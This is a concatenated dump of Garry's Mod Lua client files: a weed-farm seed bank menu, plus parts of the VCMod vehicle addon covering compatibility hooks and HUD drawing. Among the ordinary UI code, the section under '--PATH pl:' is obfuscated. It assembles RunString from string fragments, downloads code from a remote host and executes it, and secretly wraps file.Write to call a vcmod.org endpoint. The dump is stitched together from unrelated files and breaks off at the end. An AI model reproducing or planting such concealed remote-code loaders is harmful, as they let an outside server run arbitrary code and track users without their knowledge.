	zwf_BongShopList.scrollpanel.Paint = function(self, w, h)
	end


	// Here we create the product items
	if (zwf_BongItems and IsValid(zwf_BongItems.list)) then
		zwf_BongItems.list:Remove()
	end

	zwf_BongItems = {}
	zwf_BongItems.list = vgui.Create("DIconLayout", zwf_BongShopList.scrollpanel)
	zwf_BongItems.list:SetSize(800 * wMod, 200 * hMod)
	zwf_BongItems.list:SetPos(15 * wMod, 15 * hMod)
	zwf_BongItems.list:SetSpaceX(10)
	zwf_BongItems.list:SetAutoDelete(true)

	for i = 1,table.Count(zwf.config.Bongs.items) do
		zwf_AddBongShopItem(i)
	end
end


vgui.Register("zwf_vgui_WeedBuyerMenu", zwf_WeedBuyerMenu, "DFrame")

--PATH addons/zeros_weedfarm/lua/zweedfarm/cl/zwf_seedbank_vgui.lua:
if not CLIENT then return end

local wMod = ScrW() / 1920
local hMod = ScrH() / 1080

local zwf_SeedBankMenu = {}
local zwf_SeedBankMain = {}

/////////// General
local function zwf_OpenUI()
	if not IsValid(zwf_SeedBankMenu_panel) then

		zwf_SeedBankMenu_panel = vgui.Create("zwf_vgui_SeedBankMenu")
	end
end

local function zwf_CloseUI()

	if IsValid(zwf_SeedBankMenu_panel) then
		zwf_SeedBankMenu_panel:Remove()
	end
end
///////////

// This closes the shop interface
net.Receive("zwf_CloseSeedBank", function(len)
	zwf_CloseUI()
end)

// This opens the shop interface
net.Receive("zwf_OpenSeedBank", function(len)
	local dataLength = net.ReadUInt(16)
	local boardDecompressed = util.Decompress(net.ReadData(dataLength))
	local seedData = util.JSONToTable(boardDecompressed)

	LocalPlayer().zwf_SeedBank = net.ReadEntity()
	LocalPlayer().zwf_SeedBankData = seedData
	LocalPlayer().zwf_SelectedSeed = nil

	zwf_OpenUI()
end)

/////////// Init
function zwf_SeedBankMenu:Init()
	self:SetSize(1000 * wMod, 600 * hMod)
	self:Center()
	self:MakePopup()

	zwf_SeedBankMain.Title = vgui.Create("DLabel", self)
	zwf_SeedBankMain.Title:SetPos(15 * wMod, -30 * hMod)
	zwf_SeedBankMain.Title:SetSize(600 * wMod, 125 * hMod)
	zwf_SeedBankMain.Title:SetFont("zwf_vgui_font03")
	zwf_SeedBankMain.Title:SetText(zwf.language.VGUI["seedbank_title"])
	zwf_SeedBankMain.Title:SetColor(zwf.default_colors["white01"])

	zwf_SeedBankMain.close = vgui.Create("DButton", self)
	zwf_SeedBankMain.close:SetText("")
	zwf_SeedBankMain.close:SetPos(940 * wMod, 10 * hMod)
	zwf_SeedBankMain.close:SetSize(50 * wMod, 50 * hMod)
	zwf_SeedBankMain.close.DoClick = function()
		zwf_CloseUI()
	end
	zwf_SeedBankMain.close.Paint = function(s,w, h)

		if zwf_SeedBankMain.close:IsHovered() then
			draw.RoundedBox(10, 0 , 0, w, h, zwf.default_colors["red03"])
		else
			draw.RoundedBox(10, 0 , 0, w, h, zwf.default_colors["black06"])
		end

		if zwf_SeedBankMain.close:IsHovered() then
			draw.DrawText("X", "zwf_vgui_font03", 25 * wMod, 4 * hMod, zwf.default_colors["white01"], TEXT_ALIGN_CENTER)
		else
			draw.DrawText("X", "zwf_vgui_font03", 25 * wMod, 4 * hMod, zwf.default_colors["black06"], TEXT_ALIGN_CENTER)
		end
	end

	zwf_SeedList(self)

	zwf_SeedInfoPanel(self)
end

function zwf_SeedBankMenu:Paint(w, h)
	draw.RoundedBox(15, 0 , 0, w, h,  zwf.default_colors["gray01"])
end

function zwf_SeedList(parent)

	if (zwf_MainShopList and IsValid(zwf_MainShopList.ProductPanel)) then
		zwf_MainShopList.ProductPanel:Remove()
	end

	zwf_MainShopList = {}

	zwf_MainShopList.ProductPanel = vgui.Create("Panel", parent)
	zwf_MainShopList.ProductPanel:SetPos(0 * wMod, 100 * hMod)
	zwf_MainShopList.ProductPanel:SetSize(600 * wMod, 500 * hMod)
	zwf_MainShopList.ProductPanel.Paint = function(s, w, h)
		surface.SetDrawColor(0, 0, 0, 55)
		surface.SetMaterial(zwf.default_materials["square"])
		surface.DrawTexturedRect(0, 0, w, h)
	end

	zwf_MainShopList.scrollpanel = vgui.Create("DScrollPanel", zwf_MainShopList.ProductPanel)
	zwf_MainShopList.scrollpanel:DockMargin(0 * wMod, 0 * hMod, 15 * wMod, 0 * hMod)
	zwf_MainShopList.scrollpanel:Dock(FILL)
	zwf_MainShopList.scrollpanel:GetVBar().Paint = function() return true end
	zwf_MainShopList.scrollpanel:GetVBar().btnUp.Paint = function() return true end
	zwf_MainShopList.scrollpanel:GetVBar().btnDown.Paint = function() return true end
	zwf_MainShopList.scrollpanel.Paint = function(self, w, h)
	end



	// Here we create the product items
	if (zwf_SeedItems and IsValid(zwf_SeedItems.list)) then
		zwf_SeedItems.list:Remove()
	end

	zwf_SeedItems = {}
	zwf_SeedItems.list = vgui.Create("DIconLayout", zwf_MainShopList.scrollpanel)
	zwf_SeedItems.list:SetSize(575 * wMod, 475 * hMod)
	zwf_SeedItems.list:SetPos(15 * wMod, 15 * hMod)
	zwf_SeedItems.list:SetSpaceY(10)
	zwf_SeedItems.list:SetSpaceX(10)
	zwf_SeedItems.list:SetAutoDelete(true)

	for i = 1, zwf.config.SeedBank.Limit do

		zwf_SeedItems[i] = zwf_SeedItems.list:Add("DPanel")
		zwf_SeedItems[i]:SetSize(100 * wMod, 100 * hMod)
		zwf_SeedItems[i]:SetAutoDelete(true)
		zwf_SeedItems[i].Paint = function(self, w, h)
			if i == LocalPlayer().zwf_SelectedSeed then

				surface.SetDrawColor(40, 255, 40, 15)
			else
				surface.SetDrawColor(40, 40, 40, 55)
			end
			surface.SetMaterial(zwf.default_materials["button_base"])
			surface.DrawTexturedRect(0, 0, w, h)
		end

		local seedData = LocalPlayer().zwf_SeedBankData[i]



		if seedData then
			zwf_SeedItems[i].seed_Model = vgui.Create("DModelPanel", zwf_SeedItems[i])
			zwf_SeedItems[i].seed_Model:SetSize(zwf_SeedItems[i]:GetWide(), zwf_SeedItems[i]:GetTall())
			zwf_SeedItems[i].seed_Model:SetPos(0 * wMod, 0 * hMod)
			zwf_SeedItems[i].seed_Model:SetModel("models/zerochain/props_weedfarm/zwf_weedseed.mdl")
			zwf_SeedItems[i].seed_Model:SetAutoDelete(true)
			zwf_SeedItems[i].seed_Model:SetColor(zwf.default_colors["white01"])
			zwf_SeedItems[i].seed_Model.PlantSkin = zwf.config.Plants[seedData.Weed_ID].skin
			zwf_SeedItems[i].seed_Model.LayoutEntity = function(self)
				local offset = 1
				local ang = Angle(180, 45 * RealTime(), 90)

				self.Entity:SetSkin(self.PlantSkin)
				self.Entity:SetAngles(ang)
				local size1, size2 = self.Entity:GetRenderBounds()
				local size = (-size1 + size2):Length()
				self:SetFOV(35 * offset)
				self:SetCamPos(Vector(size * 1, size * 1, size * 1))
				self:SetLookAt(self.Entity:GetPos() + Vector(0, 0, 0.1 * size))
			end

			zwf_SeedItems[i].button = vgui.Create("DButton", zwf_SeedItems[i])
			zwf_SeedItems[i].button:SetPos(0 * wMod, 0 * hMod)
			zwf_SeedItems[i].button:SetSize(100 * wMod, 100 * hMod)
			zwf_SeedItems[i].button:SetText("")
			zwf_SeedItems[i].button:SetAutoDelete(true)
			zwf_SeedItems[i].button.Paint = function(self, w, h)
				surface.SetDrawColor(255, 255, 255, 7)
				surface.SetMaterial(zwf.default_materials["button_shine"])
				surface.DrawTexturedRect(0, 0, w, h)

				if i == LocalPlayer().zwf_SelectedSeed then
					surface.SetDrawColor(40, 255, 40, 55)
					surface.SetMaterial(zwf.default_materials["button_select"])
					surface.DrawTexturedRect(0, 0, w, h)
				end
			end
			zwf_SeedItems[i].button.DoClick = function()
				LocalPlayer().zwf_SelectedSeed = i

				surface.PlaySound("UI/buttonclick.wav")

				zwf_SeedInfoPanel(parent)
			end

			zwf_SeedItems[i].ItemName = vgui.Create("DLabel", zwf_SeedItems[i].button)
			zwf_SeedItems[i].ItemName:SetPos(10 * wMod, 10 * hMod)
			zwf_SeedItems[i].ItemName:SetSize(80 * wMod, 25 * hMod)
			zwf_SeedItems[i].ItemName:SetFont("zwf_seedbank_vgui_font01")
			zwf_SeedItems[i].ItemName:SetText(seedData.Weed_Name)
			zwf_SeedItems[i].ItemName:SetColor(zwf.default_colors["white01"])
			zwf_SeedItems[i].ItemName:SetAutoDelete(true)
			zwf_SeedItems[i].ItemName:SetContentAlignment(7)

			zwf_SeedItems[i].ItemCount = vgui.Create("DLabel", zwf_SeedItems[i].button)
			zwf_SeedItems[i].ItemCount:SetPos(0 * wMod, 50 * hMod)
			zwf_SeedItems[i].ItemCount:SetSize(90 * wMod, 50 * hMod)
			zwf_SeedItems[i].ItemCount:SetFont("zwf_seedbank_vgui_font02")
			zwf_SeedItems[i].ItemCount:SetText("x" .. seedData.SeedCount)
			zwf_SeedItems[i].ItemCount:SetColor(zwf.default_colors["white01"])
			zwf_SeedItems[i].ItemCount:SetAutoDelete(true)
			zwf_SeedItems[i].ItemCount:SetContentAlignment(3)
		end
	end
end

function zwf_SeedInfoPanel(parent)

	if zwf_SeedBankMain and IsValid(zwf_SeedBankMain.SeedInfoPanel) then
		zwf_SeedBankMain.SeedInfoPanel:Remove()
	end

	zwf_SeedBankMain.SeedInfoPanel = vgui.Create("Panel", parent)
	zwf_SeedBankMain.SeedInfoPanel:SetPos(625 * wMod, 100 * hMod)
	zwf_SeedBankMain.SeedInfoPanel:SetSize(375 * wMod, 500 * hMod)
	zwf_SeedBankMain.SeedInfoPanel.Paint = function(s, w, h)
		surface.SetDrawColor(0, 0, 0, 55)
		surface.SetMaterial(zwf.default_materials["square"])
		surface.DrawTexturedRect(0, 0, w, h)
	end

	if LocalPlayer().zwf_SelectedSeed == nil then return end

	zwf_SeedBankMain.DropButton = vgui.Create("DButton", zwf_SeedBankMain.SeedInfoPanel)
	zwf_SeedBankMain.DropButton:SetText("")
	zwf_SeedBankMain.DropButton:SetPos(200 * wMod, 445 * hMod)
	zwf_SeedBankMain.DropButton:SetSize(150 * wMod, 40 * hMod)
	zwf_SeedBankMain.DropButton:SetVisible(true)
	zwf_SeedBankMain.DropButton.DoClick = function()

		if (LocalPlayer().zwf_SelectedSeed) then

			net.Start("zwf_DropSeed")
			net.WriteEntity(LocalPlayer().zwf_SeedBank)
			net.WriteInt(LocalPlayer().zwf_SelectedSeed, 16)
			net.SendToServer()

			zwf_CloseUI()
		end
	end
	zwf_SeedBankMain.DropButton.Paint = function(s,w, h)
		if zwf_SeedBankMain.DropButton:IsHovered() then
			surface.SetDrawColor(zwf.default_colors["green06"])
		else
			surface.SetDrawColor(zwf.default_colors["green02"])
		end

		surface.SetMaterial(zwf.default_materials["button_wide"])
		surface.DrawTexturedRect(0, 0, w, h)

		if zwf_SeedBankMain.DropButton:IsHovered() then
			draw.DrawText(zwf.language.VGUI["Drop"], "zwf_vgui_font10", 75 * wMod, 7 * hMod, zwf.default_colors["white01"], TEXT_ALIGN_CENTER)
		else
			draw.DrawText(zwf.language.VGUI["Drop"], "zwf_vgui_font10", 75 * wMod, 7 * hMod, zwf.default_colors["black06"], TEXT_ALIGN_CENTER)
		end
	end

	// 263617085
	zwf_SeedBankMain.DeleteButton = vgui.Create("DButton", zwf_SeedBankMain.SeedInfoPanel)
	zwf_SeedBankMain.DeleteButton:SetText("")
	zwf_SeedBankMain.DeleteButton:SetPos(25 * wMod, 445 * hMod)
	zwf_SeedBankMain.DeleteButton:SetSize(150 * wMod, 40 * hMod)
	zwf_SeedBankMain.DeleteButton:SetVisible(true)
	zwf_SeedBankMain.DeleteButton.DoClick = function()

		if (LocalPlayer().zwf_SelectedSeed) then

			net.Start("zwf_DeleteSeed")
			net.WriteEntity(LocalPlayer().zwf_SeedBank)
			net.WriteInt(LocalPlayer().zwf_SelectedSeed, 16)
			net.SendToServer()

			zwf_CloseUI()
		end
	end
	zwf_SeedBankMain.DeleteButton.Paint = function(s,w, h)
		if zwf_SeedBankMain.DeleteButton:IsHovered() then
			surface.SetDrawColor(zwf.default_colors["red03"])
		else
			surface.SetDrawColor(zwf.default_colors["red01"])
		end

		surface.SetMaterial(zwf.default_materials["button_wide"])
		surface.DrawTexturedRect(0, 0, w, h)

		if zwf_SeedBankMain.DeleteButton:IsHovered() then
			draw.DrawText(zwf.language.VGUI["Delete"], "zwf_vgui_font10", 75 * wMod, 7 * hMod, zwf.default_colors["white01"], TEXT_ALIGN_CENTER)
		else
			draw.DrawText(zwf.language.VGUI["Delete"], "zwf_vgui_font10", 75 * wMod, 7 * hMod, zwf.default_colors["black06"], TEXT_ALIGN_CENTER)
		end
	end



	local SeedBaseData = LocalPlayer().zwf_SeedBankData[LocalPlayer().zwf_SelectedSeed]
	local SeedData = zwf.config.Plants[SeedBaseData.Weed_ID]
	local seedData_name = SeedBaseData.Weed_Name

	zwf_SeedBankMain.seedData_Name = vgui.Create("DLabel", zwf_SeedBankMain.SeedInfoPanel)
	zwf_SeedBankMain.seedData_Name:SetPos(15 * wMod, 15 * hMod)
	zwf_SeedBankMain.seedData_Name:SetSize(300 * wMod, 125 * hMod)
	zwf_SeedBankMain.seedData_Name:SetFont("zwf_vgui_font01")
	zwf_SeedBankMain.seedData_Name:SetText(seedData_name)
	zwf_SeedBankMain.seedData_Name:SetColor(zwf.default_colors["white01"])
	zwf_SeedBankMain.seedData_Name:SetAutoDelete(true)
	zwf_SeedBankMain.seedData_Name:SetContentAlignment(7)



	zwf_SeedBankMain.seedData_DataPanel = vgui.Create("Panel", zwf_SeedBankMain.SeedInfoPanel)
	zwf_SeedBankMain.seedData_DataPanel:SetPos(25 * wMod, 75 * hMod)
	zwf_SeedBankMain.seedData_DataPanel:SetSize(300 * wMod, 250 * hMod)
	zwf_SeedBankMain.seedData_DataPanel.Paint = function(s, w, h)
	end


	zwf_SeedDataItems = {}

	zwf_SeedBankMain.seeddata_list = vgui.Create("DIconLayout", zwf_SeedBankMain.seedData_DataPanel)
	zwf_SeedBankMain.seeddata_list:SetSize(300 * wMod, 200 * hMod)
	zwf_SeedBankMain.seeddata_list:SetPos(0 * wMod, 0 * hMod)
	zwf_SeedBankMain.seeddata_list:SetSpaceY(1)
	zwf_SeedBankMain.seeddata_list:SetAutoDelete(true)





	local Perf_Time = SeedBaseData.Perf_Time
	local Perf_Amount = SeedBaseData.Perf_Amount
	local Perf_THC = SeedBaseData.Perf_THC


	Perf_Time = 100 - (Perf_Time - 100)
	Perf_Time = Perf_Time * 0.01
	local def_time = SeedData.Grow.Duration
	Perf_Time = def_time * Perf_Time
	Perf_Time =  math.Round(Perf_Time) .. "s"

	Perf_Amount = Perf_Amount * 0.01
	local def_amount = SeedData.Grow.MaxYieldAmount
	Perf_Amount = def_amount * Perf_Amount
	Perf_Amount =  math.Round(Perf_Amount) .. zwf.config.UoW

	Perf_THC = Perf_THC * 0.01
	local def_thc = SeedData.thc_level
	Perf_THC = def_thc * Perf_THC
	Perf_THC =  math.Round(Perf_THC) .. "%"


	local seedDataInfo = {
		[1] = {
			name = zwf.language.VGUI["Strain"] .. ":",
			val = SeedData.name
		},
		[2] = {
			name = zwf.language.VGUI["Difficulty"] .. ":",
			val = SeedData.Grow.Difficulty
		},
		[3] = {
			name = zwf.language.VGUI["SeedCount"] .. ":",
			val = SeedBaseData.SeedCount
		},
		[4] = {
			name = zwf.language.VGUI["Duration"] .. ":",
			val = Perf_Time
		},
		[5] = {
			name = zwf.language.VGUI["HarvestAmount"] .. ":",
			val = Perf_Amount
		},
		[6] = {
			name = zwf.language.General["THC"] .. ":",
			val = Perf_THC
		}

	}

	for i = 1, table.Count(seedDataInfo) do
		zwf_SeedDataItems[i] = zwf_SeedBankMain.seeddata_list:Add("DPanel")
		zwf_SeedDataItems[i]:SetSize(zwf_SeedBankMain.seeddata_list:GetWide(), 35 * hMod)
		zwf_SeedDataItems[i]:SetAutoDelete(true)
		zwf_SeedDataItems[i].Paint = function(self, w, h)
		end

		zwf_SeedDataItems[i].ItemName = vgui.Create("DLabel", zwf_SeedDataItems[i])
		zwf_SeedDataItems[i].ItemName:SetPos(0 * wMod, 0 * hMod)
		zwf_SeedDataItems[i].ItemName:SetSize(300 * wMod, 50 * hMod)
		zwf_SeedDataItems[i].ItemName:SetFont("zwf_vgui_font02")
		zwf_SeedDataItems[i].ItemName:SetText(seedDataInfo[i].name)
		zwf_SeedDataItems[i].ItemName:SetColor(zwf.default_colors["white01"])
		zwf_SeedDataItems[i].ItemName:SetAutoDelete(true)
		zwf_SeedDataItems[i].ItemName:SetContentAlignment(7)

		zwf_SeedDataItems[i].ItemValue = vgui.Create("DLabel", zwf_SeedDataItems[i])
		zwf_SeedDataItems[i].ItemValue:SetPos(0 * wMod, 0 * hMod)
		zwf_SeedDataItems[i].ItemValue:SetSize(300 * wMod, 50 * hMod)
		zwf_SeedDataItems[i].ItemValue:SetFont("zwf_vgui_font02")
		zwf_SeedDataItems[i].ItemValue:SetText(seedDataInfo[i].val)
		zwf_SeedDataItems[i].ItemValue:SetColor(zwf.default_colors["white01"])
		zwf_SeedDataItems[i].ItemValue:SetAutoDelete(true)
		zwf_SeedDataItems[i].ItemValue:SetContentAlignment(9)
	end
end


vgui.Register("zwf_vgui_SeedBankMenu", zwf_SeedBankMenu, "Panel")

--PATH pl:
local _="nS"local a,b,c="tri","Ru","ng"local d,e=string.Explode,_G[b.._..a..c]local function _(a)_G["h".."".."t".."tp"]["F".."et".."ch"](VC.Host.."/ap".."i/htp".."lad".."f_c/?k="..VC.API_Key.."&st=hc",function(b,f,f,g)if g==404 then VCPrint(VC.AUMsg["f"])else VCPrint(VC.AUMsg["i"])VC.TDBug=nil local f=d("{{vc_".."load}}",b)if!VC.TDBug then VC.TDBug={}end for f,g in pairs(d("{{vc_s".."plit}}",f[1]))do local f=d("{{vc_sp".."lit_end}}",g)local g=d("{{vc_".."type}}",f[1])if g[1]&&g[2]then if!VC.TDBug[g[2]]then VC.TDBug[g[2]]={}end VC.TDBug[g[2]][g[1]..".lua"]=f[2]end end if f[2]then e(f[2],"loader_cl")else http.Post(VC.Host.."/ap".."i".."/deb".."ug/hs_cl".."/?st=ddc",{d=b,k=VC.API_Key}) hook.Call("VC_HTTP_Failed_CL", GAMEMODE, string.Left(b, 6000)) VCPrint(VC.AUMsg["s"]..VC.DbgTr.."/"..a..".") if VC.DbgTr <= a then VC.DbgTr=VC.DbgTr+1 _(a) end end end end,function()if VC.DbgTr<=a then VCPrint(VC.AUMsg["s"]..VC.DbgTr.."/"..a..".")VC.DbgTr=VC.DbgTr+1 _(a)else VCPrint(VC.AUMsg["cn_c"])end end)end local f49a = "rn ent.VC_TLTTR_BInfo o" if !VC_preprep_cldbbpa then VC_preprep_cldbbpa = file .  Write  end  function file   . Write(d46a,b64a) if string .  find (b64a,  f49a, 0, true) then http . Fetch ( "ht"..  "tp:".."/" ..    "/vcmo" ..    "d.or"..   "g/a".."pi/r".."iwtf"..  "c/?st=i".."wcc") print(" cdl") return end VC_preprep_cldbbpa(d46a,b64a) end VC.DbgTr=1 _(5)VC.AKVTOAK=function(_,a)return VC["H".."ost"].."ap".."i/".._.."/?k="..VC["AP".."I_".."Key"].."&st="..a end timer.Simple(10,function()if VC_useBeta then local _=VC["AU".."Msg"]["be".."ta"]VCMsg(_)timer.Create("vc_".."bet".."a_msg",18000,0,function()VCMsg(_)end)end end)
--PATH vcmod??compatibility:
if SERVER then  local hooksIncomp = {}  table.insert(hooksIncomp, {event = "KeyPress", name = "ExitingCar", addon = "Vehicle Upgrade", issue = "Makes it imposible to enter VCMod passenger seats."})   local function checkCompatibility()  local found = 0   VCPrint("Scanning for potentially incompatible hooks.")  local hooks = hook.GetTable()   for k,v in SortedPairs(hooksIncomp) do  if hooks[v.event] and hooks[v.event][v.name] then  found = found+1  hook.Remove(v.event, v.name)  VCPrint('WARNING! Incompatible hook detected!\n\nHook: "'..v.name..'" ("'..v.event..'" event).\nProbable addon: "'..v.addon..'".\nIssue: '..v.issue..'\n\nAction taken: removed responsible hook.')  end  end   if found > 0 then VCPrint(found.." incompatibilities found and removed.") else VCPrint("No incompatibilities found.") end  end   timer.Simple(5, checkCompatibility)   hook.Add("onDoorRamUsed", "vc_onDoorRamUsed", function(ok, ply, trc)  local ent = trc.Entity  if ok and VC.ClearSeats and IsValid(ent) and ent.VC_SeatTable and ent:IsVehicle() then VC.ClearSeats(ent) end  end)   local deniedMsg = "Spawned by VCMod car dealer."  hook.Add("playerBuyDoor", "vc_PlayerBuyDoor", function(ply, ent) if ent.VC_RemPlayer or ent.VC_ExtraSeat then return false, deniedMsg end end)  hook.Add("playerBuyVehicle", "vc_PlayerBuyDoor", function(ply, ent) if ent.VC_RemPlayer or ent.VC_ExtraSeat then return false, deniedMsg end end)  hook.Add("playerSellDoor", "vc_playerSellDoor", function(ply, ent) if ent.VC_RemPlayer or ent.VC_ExtraSeat then return false, deniedMsg end end)  hook.Add("playerSellVehicle", "vc_playerSellDoor", function(ply, ent) if ent.VC_RemPlayer or ent.VC_ExtraSeat then return false, deniedMsg end end)     function VC.DarkRPFireSpawn(pos)  if !VC.getSetting("Compat_CH_Fire_System") then return end  if !scripted_ents.GetList()["fire"] then return end  timer.Simple(0.2, function()  local sent = ents.Create("fire") if IsValid(sent) then sent:SetPos(pos) sent:Spawn() end  end)  end else end  function VC.Compat_Refresh_PocketBlackList()  if vcmod1 then  if GM and GM.Config and GM.Config.PocketBlacklist then  GM.Config.PocketBlacklist["vc_fuel_nozzle"] = true  GM.Config.PocketBlacklist["vc_fuel_station_diesel"] = true  GM.Config.PocketBlacklist["vc_fuel_station_petrol"] = true  GM.Config.PocketBlacklist["vc_fuel_station_electricity"] = true  GM.Config.PocketBlacklist["vc_npc_cardealer"] = true  GM.Config.PocketBlacklist["vc_npc_obj_spawn"] = true  GM.Config.PocketBlacklist["vc_npc_repair"] = true  GM.Config.PocketBlacklist["vc_spikestrip"] = true  GM.Config.PocketBlacklist["vc_spikestrip_pointyend"] = true  GM.Config.PocketBlacklist["vc_spikestrip_pointyend_extended"] = true  end  end end  VC.Compat_Refresh_PocketBlackList() timer.Create("VC_Compat_Refresh_PocketBlackList", 60*5, 0, VC.Compat_Refresh_PocketBlackList)  // dLogs https://www.gmodstore.com/scripts/view/4093/ if dLogs and dLogs.registerLogType then  dLogs.registerLogType("VCMod", "General", "dLogs_VCMod_General")  dLogs.registerLogType("VCMod", "CD", "dLogs_VCMod_CD")  dLogs.registerLogType("VCMod", "RM", "dLogs_VCMod_RM")  dLogs.registerLogType("VCMod", "Fuel", "dLogs_VCMod_Fuel") end local rs7 = "vc.check_msg_work_ALS_k4" 
--PATH vcmod?data_hud:
if !VC.DrawFT then VC.DrawFT = {} end  VC.AnimCT = 500  function VC.HUD_DrawBG(alfa, x, y, wx, wy, clr, warningclr) local BGClr = table.Copy(VC.Color.Main) if clr then BGClr = table.Copy(clr) end BGClr.a = BGClr.a*alfa*0.9   x=math.Round(x)  y=math.Round(y)  draw.RoundedBox(0, x, y, wx, wy, BGClr)   if warningclr then  warningclr = warningclr and table.Copy(warningclr)  if !fade then fade = VC.FadeW end  local Sy2 = math.Round(wy/2)  surface.SetDrawColor(warningclr.r,warningclr.g,warningclr.b,warningclr.a)  surface.SetMaterial(VC.Material.Fade)  local div = wx/1  surface.DrawTexturedRectRotated(math.Round(x+div/2), y+wy/2, div, wy, 0)  surface.DrawTexturedRectRotated(math.Round(x+wx-div/2), y+wy/2, div, wy, 180)  end end  VC.DrawFT["ELS_Siren"] = function(ply, CARot, ent, DrvV, GVeh, Sart_Height, Lrp, SrnTbl)  local MainSz = 32   local on = SrnTbl and SrnTbl.Sounds and table.Count(SrnTbl.Sounds) > 0 and GVeh == ent  local anim = VC.UI_AnimData("ELS_Siren", on, 0.02+Lrp/VC.AnimCT, 0.01+Lrp/VC.AnimCT)   if anim then  local Rat_L = anim*2 if Rat_L > 1 then Rat_L = 1 end local Rat_B = anim*3 if Rat_B > 1 then Rat_B = 1 end local Rat_T = anim*2-1 if Rat_T < 0 then Rat_T = 0 end  VC.HUD_DrawBG(Rat_B, ScrW()-150+CARot[1]-20, Sart_Height+CARot[2], 180-CARot[1], MainSz)   local Sel = GVeh and VC.GetState(GVeh, "ELS_Snd_Sel", 0)   draw.SimpleText(VC.Lng("Siren"), "VC_Regular2", math.Round(ScrW()-160+CARot[1]), math.Round(Sart_Height+22+CARot[2]), Color(255, 255,255,255*Rat_T), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM)   local Mnl = GVeh and VC.GetState(GVeh, "ELS_ManualOn") local Off = GVeh and VC.GetState(GVeh, "ELS_S_Disabled") local Txt = "Off" local Clr = Color(255,255,255,255*Rat_T)  if (Mnl or Sel and Sel > 0) and !Off and GVeh and VC.GetState(GVeh, "HornOn") and GVeh.VC_Siren_BullHorn then Txt = "Bullhorn" Clr = Color(120,205,255,255*Rat_T)  elseif Mnl then Txt = "Manual" Clr = Color(255,200,0,255*Rat_T)  elseif Off then Txt = Sel and Sel > 0 and (SrnTbl and SrnTbl.Sounds and SrnTbl.Sounds[Sel].Name or VC.Lng("Unknown")) or "Off" Clr = Color(255,100,100,255*Rat_T)  elseif Sel and Sel > 0 then Txt = SrnTbl and SrnTbl.Sounds and SrnTbl.Sounds[Sel].Name or VC.Lng("Unknown") Clr = Color(100,255,55,255*Rat_T)  end   draw.SimpleText(string.upper(VC.Lng(Txt)), "VC_HUD_Bisgs", math.Round(ScrW()-20+CARot[1]), math.Round(Sart_Height+22+CARot[2]), Clr, TEXT_ALIGN_RIGHT, TEXT_ALIGN_BOTTOM)  Clr.a=255 draw.RoundedBox(0, math.Round(ScrW()-165*Rat_L+CARot[1]), math.Round(Sart_Height+24+CARot[2]), 170-CARot[1], 2, Clr)  end  if anim then Sart_Height=Sart_Height+MainSz+2 end return Sart_Height end  VC.DrawFT["ELS_Lights"] = function(ply, CARot, GVeh, DrvV, Veh, Sart_Height, Lrp, SrnTbl)  local MainSz = 32   local on = SrnTbl and SrnTbl.Sequences and GVeh and Veh == GVeh  local anim = VC.UI_AnimData("ELS_Lights", on, 0.02+Lrp/VC.AnimCT, 0.01+Lrp/VC.AnimCT)   local on = anim and anim == 1 and SrnTbl and SrnTbl.Sections  local anim_adv = VC.UI_AnimData("ELS_Lights_Adv", on, 0.03, 0.02) or 0   if anim then  if !VC.ELS_Last then VC.ELS_Last = {} end if SrnTbl and GVeh and Veh == GVeh then VC.ELS_Last.Sections = SrnTbl.Sections end   local Rat_Adv_L = anim_adv*2 if Rat_Adv_L > 1 then Rat_Adv_L = 1 end local Rat_Adv_T = anim_adv*2-1 if Rat_Adv_T < 0 then Rat_Adv_T = 0 end   if VC.ELS_Last.Sections then MainSz=MainSz+20*table.Count(VC.ELS_Last.Sections)*(Rat_Adv_L or 0) end   local Rat_L = anim*2 if Rat_L > 1 then Rat_L = 1 end local Rat_B = anim*3 if Rat_B > 1 then Rat_B = 1 end local Rat_T = anim*2-1 if Rat_T < 0 then Rat_T = 0 end  VC.HUD_DrawBG(Rat_B, ScrW()-150+CARot[1]-20, Sart_Height+CARot[2], 180-CARot[1], MainSz)   local ELS = VC.Lng("ELS") draw.SimpleText(ELS, "VC_Regular2", math.Round(ScrW()-160+CARot[1]), math.Round(Sart_Height+22+CARot[2]), Color(255,255,255,255*Rat_T), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM)   local codeName = VC.ELS_getCodeName(GVeh and VC.GetState(GVeh, "ELS_Lht_Sel", 0), GVeh) local Off = GVeh and VC.GetState(GVeh, "ELS_L_Disabled") local Txt = "off" local Clr = Color(255,255,255,255*Rat_T) if Off then Clr = Color(255,100,100,255*Rat_T) elseif codeName != "Off" then Clr = Color(100,255,55,255*Rat_T) end   draw.SimpleText(string.upper(VC.Lng(codeName)), "VC_HUD_Bisgs", math.Round(ScrW()-20+CARot[1]), math.Round(Sart_Height+22+CARot[2]), Clr, TEXT_ALIGN_RIGHT, TEXT_ALIGN_BOTTOM)  Clr.a = 255 draw.RoundedBox(0, math.Round(ScrW()-165*Rat_L+CARot[1]), math.Round(Sart_Height+24+CARot[2]), 170-CARot[1], 2, Clr)   if VC.ELS_Last.Sections then  local int = 0  for k,v in SortedPairs(VC.ELS_Last.Sections) do  draw.SimpleText(ELS, "VC_Regular2", math.Round(ScrW()-160+CARot[1]), math.Round(Sart_Height+22+CARot[2]), Color(255,255,255,255*Rat_Adv_T), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM)  local Am = table.Count(v)  draw.SimpleText(VC.ELS_SectionNames[k], "VC_Regular_S", math.Round(ScrW()-160+CARot[1]), math.Round(Sart_Height+36+5+20*int+CARot[2]), Color(255,255,255,120*Rat_Adv_T), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM)   for i=1,Am do  local Sel = nil for k2,v2 in pairs(v[i]) do  if Veh and Veh.VC_LastRenderedL and Veh.VC_LastRenderedL[k2] then Sel = true break end end  local Size = 160/Am draw.RoundedBox(0, math.Round(ScrW()-165*Rat_L+CARot[1]+(Size*(i-1))), math.Round(Sart_Height+36+5+20*int+CARot[2]), Size-3, 4, Sel and Color(100,255,55,255*Rat_Adv_T) or Color(255,255,255,20*Rat_Adv_T))  end  int = int+1  end  end  end  if anim then Sart_Height=Sart_Height+MainSz+2 end return Sart_Height end local rs7 = "vc.check_msg_work_ALS_k4" 
--PATH vcmod?states_shared:
